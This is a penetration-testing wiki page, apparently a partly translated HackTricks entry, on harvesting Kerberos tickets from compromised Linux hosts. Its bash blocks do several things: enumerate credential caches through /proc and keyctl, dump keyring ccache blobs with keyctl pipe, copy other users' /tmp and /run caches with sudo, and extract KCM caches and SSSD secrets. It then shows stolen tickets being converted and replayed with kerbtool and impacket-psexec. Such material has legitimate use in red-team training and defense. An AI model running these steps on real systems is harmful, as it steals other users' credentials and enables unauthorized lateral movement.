# 从 Linux 收集票证

{{#include ../../banners/hacktricks-training.md}}

### Linux 中的凭证存储

Linux 系统将凭证存储在三种缓存类型中，分别是 **Files**（在 `/tmp` 目录中）、**Kernel Keyrings**（Linux 内核中的一个特殊段）和 **Process Memory**（供单个进程使用）。`/etc/krb5.conf` 中的 **default_ccache_name** 变量会显示正在使用的存储类型，如果未指定，默认为 `FILE:/tmp/krb5cc_%{uid}`。

MIT/Heimdal 还支持其他后端，你在 post-exploitation 期间应注意查找：

- `DIR:/run/user/%{uid}/krb5cc` 表示基于目录的多票证缓存（在现代发行版上 systemd-logind 的默认设置）。
- `KEYRING:persistent:%{uid}` 或 `KEYRING:session` 用于将 ccaches 存放在内核 keyring（`KEY_SPEC_SESSION_KEYRING`、`KEY_SPEC_USER_KEYRING` 等）中。
- `KCM:%{uid}` 当 SSSD 的 Kerberos Cache Manager 守护进程 (kcm) 作为票证存储的前端时使用。
- `MEMORY:unique_id` 用于由库（如 `gssproxy`、`sshd` 等）创建的进程本地缓存。

每当你获得 shell 时，应该从感兴趣的守护进程（例如 Apache、sshd、gssproxy）的 `/proc/<pid>/environ` 中导出 `KRB5CCNAME`，以在开始复制文件之前确认正在使用哪个缓存后端。

### 枚举活动缓存

在提取之前枚举缓存，以免错过高价值的票证：
```bash
$ klist -l            # list caches registered in the local keyring/KCM
$ klist -A            # show all ticket-granting tickets in the current cache
$ sudo keyctl get_persistent @u
$ sudo keyctl show `keyctl get_persistent @u`
$ sudo ls -al /tmp/krb5cc_* /run/user/*/krb5cc*
$ sudo find /proc -maxdepth 2 -name environ -exec sh -c 'tr "\0" "\n" < {} | grep -H KRB5' \;
```
The combination of `klist`, `keyctl`, and `/proc` inspection quickly reveals whether credentials live in files, keyrings, or KCM so you can pick the right dumping technique.

### Extracting Credentials

The 2017 paper, [**Kerberos Credential Thievery (GNU/Linux)**](https://www.delaat.net/rp/2016-2017/p97/report.pdf), outlines methods for extracting credentials from keyrings and processes, emphasizing the Linux kernel's keyring mechanism for managing and storing keys.

#### Keyring Extraction Overview

The **keyctl system call**，在内核版本 2.6.10 引入，允许用户空间应用与内核 keyring 交互。存于 keyring 中的凭证以组件形式保存（default principal 和 credentials），不同于也包含头部的 file ccaches。论文中的 **hercules.sh script** 演示了如何提取并重建这些组件为可用的 file ccache 以便进行凭证窃取。请记住，存于 keyring 的 ccaches 可能存在于 `KEYRING:persistent:%{uid}`（跨登录持久存在）、`KEYRING:session`（登出时清除），或用于派生辅助线程的服务的 `KEY_SPEC_THREAD_KEYRING`——因此务必为被入侵的 UID 枚举所有 keyring 类型。

#### Manual KEYRING Workflow

You can manually harvest tickets without helper scripts whenever `default_ccache_name` is set to `KEYRING`:
```bash
$ KRING=$(keyctl get_persistent @u)
$ keyctl show $KRING                       # note the key serial of each ccache blob
$ keyctl pipe <serial> > /tmp/ccache_dump  # write raw blob to disk
$ KRB5CCNAME=/tmp/ccache_dump klist        # validate the stolen cache
```
如果存储了多个 principal，则对每个 serial 重复 `keyctl pipe` 步骤，然后在从其他机器重放之前，使用诸如 `kerbtool`（见下文）或 `ticketConverter.py` 之类的工具将提取出的 ccache 转换为 Windows 友好的 `.kirbi`/`.ccache`。

#### File/DIR Cache Theft Quick Wins

当凭据以 `FILE:` 或 `DIR:` 缓存存储时，通常只需简单的文件操作即可：
```bash
$ sudo cp /tmp/krb5cc_1000 /tmp/websvc.ccache
$ sudo cp -r /run/user/1000/krb5cc /tmp/user1000_dircc
$ chmod 600 /tmp/*.ccache && chown attacker /tmp/*.ccache
```
Directory caches contain one file per service ticket, so compress and exfiltrate the whole directory to keep TGT + TGS pairs intact. You can also point your tooling at the directory directly: `KRB5CCNAME=DIR:/tmp/user1000_dircc impacket-psexec ...`.

#### Dumping KCM-Managed Caches

SSSD’s Kerberos Cache Manager (kcm) 通过 `/var/run/kcm/kcmsock`（或 `/run/.heim_org.h5l.kcm-socket`）代理凭证存储，并将加密的 blob 持久化在 `/var/lib/sss/secrets/`，同时保存 `.secrets.mkey`。攻击流程：

1. 通过 `/etc/krb5.conf`（`default_ccache_name = KCM:`）或 `klist -l` 的输出识别是否使用 KCM。
2. 如果你拥有 UID 0 或属于 `kcm` SELinux 域，通过管理工具枚举缓存：
```bash
$ sudo kcm_ctl list                 # lists UID + cache IDs handled by kcm
$ sudo kcm_ctl get 1000 0 > /tmp/1000.kcm.ccache
$ KRB5CCNAME=/tmp/1000.kcm.ccache klist
```
3. 离线方法：复制 `/var/lib/sss/secrets/secrets.ldb` 和 `/var/lib/sss/secrets/.secrets.mkey`，然后运行 `SSSDKCMExtractor`（或类似 PoC）来解密并重组 ccaches，而无需触碰实时 socket。当用于取证或 socket ACL 阻止但磁盘可访问时，这尤其有用。

因为 kcm daemon 遵从由 SSSD 强制的基于 UID 的 ACL，通常需要提权到 root（或攻破 `sssd_kcm`），但一旦成功，你可以在几秒钟内转储每个用户的 TGT。

### 票据提取工具

将上述步骤自动化可以减少失误，并为你提供可在 Windows 工具中重放的跨平台票据材料。

#### Tickey

基于 **hercules.sh script** 的原理，[**tickey**](https://github.com/TarlogicSecurity/tickey) 工具专为从 keyrings 中提取票据而设计，可通过 `/tmp/tickey -i` 执行。它枚举内核 keyrings，重建序列化的 ccaches，并写出兼容 MIT 的 cache 文件，你可以立即将这些文件交给 `klist`、`impacket-*` 或 `kerberoast` 工具使用。

#### Kerbtool

[**kerbtool**](https://github.com/jfjallid/kerbtool) 是一个现代的 Go 实用工具，原生运行于 Linux，可解析、转换并请求 Kerberos 票据。从 Linux 主机收集时有两个常用场景：
```bash
# Convert a stolen MIT ccache into a .kirbi usable by Windows tooling
$ ./kerbtool --convert --in /tmp/websvc.ccache --out websvc.kirbi

# Use an extracted cache to request additional TGS tickets without touching the victim again
$ KRB5CCNAME=/tmp/websvc.ccache ./kerbtool --ask --spn cifs/fileserver.lab.local
```
在你的 implant 主机上同时拥有 tickey 和 kerbtool 可以让你在 Linux、Windows 和跨平台 Kerberos 攻击链之间无缝切换。

## 参考资料

- [**https://www.tarlogic.com/en/blog/how-to-attack-kerberos/**](https://www.tarlogic.com/en/blog/how-to-attack-kerberos/)
- [**https://docs.pagure.org/sssd.sssd/design_pages/kcm.html**](https://docs.pagure.org/sssd.sssd/design_pages/kcm.html)
- [**https://github.com/jfjallid/kerbtool**](https://github.com/jfjallid/kerbtool)

{{#include ../../banners/hacktricks-training.md}}
